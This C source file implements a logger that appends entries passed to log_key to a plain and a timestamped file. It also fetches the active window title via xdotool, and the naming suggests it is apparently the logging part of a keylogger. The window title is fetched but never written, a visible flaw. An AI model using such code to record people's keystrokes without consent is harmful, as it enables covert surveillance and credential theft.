// logger.c
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "../include/logger.h" // Ensure this path is correct

static FILE *plain_fp = NULL;
static FILE *ts_fp   = NULL;

/* -----------------------------------------------------------
 * Helper: get the current active window’s title (X11 systems)
 * -----------------------------------------------------------
 * Uses xdotool if available; falls back to "unknown".
 */
static void get_active_window(char *buf, size_t len)
{
    if (!buf || len == 0) return;

    // Execute xdotool command to get the active window name
    // 2>/dev/null redirects stderr to null, suppressing errors if xdotool isn't found
    FILE *fp = popen("xdotool getactivewindow getwindowname 2>/dev/null", "r");
    if (fp) {
        if (fgets(buf, (int)len, fp)) {
            buf[strcspn(buf, "\n")] = 0;          // strip newline character
        } else {
            // If fgets fails (e.g., empty output), set to unknown
            strncpy(buf, "unknown", len);
            buf[len - 1] = '\0'; // Ensure null termination
        }
    } else {
        // Fallback if popen fails (e.g., xdotool not found)
        strncpy(buf, "unknown", len);
        buf[len - 1] = '\0'; // Ensure null termination
    }

    if (fp) pclose(fp); // Close the pipe
}

int init_logger(const char *plain_path, const char *timestamped_path)
{
    // Open files in append mode, creating them if they don't exist
    plain_fp = fopen(plain_path, "a");
    ts_fp    = fopen(timestamped_path, "a");
    // Return 0 on success, non-zero on failure
    return !(plain_fp && ts_fp);
}

void log_key(const char *type, const char *data)
{
    if (!plain_fp || !ts_fp) return; // Ensure files are open

    /* --- Write to plain log (no timestamp) ---------------- */
    fprintf(plain_fp, "%s ", data);
    fflush(plain_fp); // Ensure data is written to disk immediately

    /* --- Prepare timestamp and active window info --------- */
    time_t     now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char  ts_buf[32]; // Buffer for timestamp string
    strftime(ts_buf, sizeof(ts_buf), "%Y-%m-%d %H:%M:%S", tm_info); // Format timestamp

    char window_buf[256]; // Buffer for window title, increased size for longer titles
    get_active_window(window_buf, sizeof(window_buf)); // Get active window title

    /* --- Write to timestamped log ------------------------- */
    fprintf(ts_fp, "[%s] %s: %s\n", ts_buf, type, data);
    fflush(ts_fp); // Ensure data is written to disk immediately
}

void close_logger(void) // Added void for function signature consistency
{
    if (plain_fp) fclose(plain_fp);
    if (ts_fp)    fclose(ts_fp);
    plain_fp = NULL;
    ts_fp = NULL;
}
